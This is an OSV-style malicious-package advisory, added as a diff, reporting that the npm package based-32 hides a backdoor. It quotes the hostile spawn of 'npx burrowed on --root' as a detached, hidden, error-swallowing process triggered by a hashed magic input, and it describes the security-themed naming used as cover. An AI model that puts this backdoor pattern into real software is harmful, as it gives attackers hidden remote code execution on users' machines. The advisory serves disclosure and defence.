@@ -1,0 +1,95 @@
+{
+  "modified": "2026-06-25T07:49:53Z",
+  "published": "2026-06-25T06:53:14Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-6447",
+  "summary": "Malicious code in based-32 (npm)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (52ca241d887ed83628c8c4a4432ca0f832d092e6058c7ab4250cc5b169ba7fb9)\nbased-32 advertises itself as a zero-dependency RFC4648 Base32 encoding library, but `dist/index.js` ships a hidden trigger inside the exported `handleSecureEncode()` function (also reachable via the `based32 -s \u003cdata\u003e` CLI). The function passes the caller's input through `checkSecurityProtocol()`, which SHA-256-hashes the input and compares it against the hardcoded constant `SECURITY_HASH = \"71c37c896ba7d9164cc91cb4507df9d3f42bd2ce728a93673b3dabfda45c7ed2\"`. On match, it executes `spawn('npx', ['burrowed','on','--root'], { detached: true, stdio: 'ignore', windowsHide: true, shell: true })` and calls `unref()` on the child, fetching and running the remote `burrowed` npm package as a detached, stdio-suppressed, window-hidden daemon. The surrounding try/catch swallows all errors so failures are silent. The naming (`SECURITY_HASH`, `checkSecurityProtocol`, `handleSecureEncode`) is a cover story — none of this behavior is documented in the README, and there is no Base32-related reason for the package to spawn npx, fetch a remote package, or run a daemon. Any environment where an attacker can deliver the magic input string into `handleSecureEncode` (or invoke `based32 -s`) gains arbitrary remote-code execution as a hidden background process under the installer's user.\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "based-32"
+      },
+      "versions": [
+        "1.0.1",
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "dist/index.js",
+              "sha256": "30bd4c4c846d677dee336485169e1ed62b6f15e4c30a2f75b32afd3c79a20356",
+              "tlsh": "0a41fe9c5df675a4025320ba07efc409205e96133444cab8bf5c97854f41b6c9bf6fe8"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "based-32-1.0.1.tgz",
+              "hashes": {
+                "sha1": "1a91f17740507c942fe63a0fb39b5329cb25f718",
+                "sha512_sri": "sha512-7vg100bIpzfkXfu4VuD/nqDDDrYmCtjRpQfEn9YkL8139KxdEX6t6feqQJqM0nP+zylfTqQ3Tdmlwm5+39MzkA=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/based-32/v/1.0.1"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/based-32/v/1.0.0"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-007497",
+        "import_time": "2026-06-25T07:47:52.103938191Z",
+        "modified_time": "2026-06-25T06:53:20Z",
+        "sha256": "52ca241d887ed83628c8c4a4432ca0f832d092e6058c7ab4250cc5b169ba7fb9",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.1"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-007496",
+        "import_time": "2026-06-25T07:47:52.03261588Z",
+        "modified_time": "2026-06-25T06:53:14Z",
+        "sha256": "f22b5e641b6f6d20d913c25660bec23599f6fd35e4d9110b48841a7ec33f3730",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.0"
+        ]
+      }
+    ]
+  }
+}
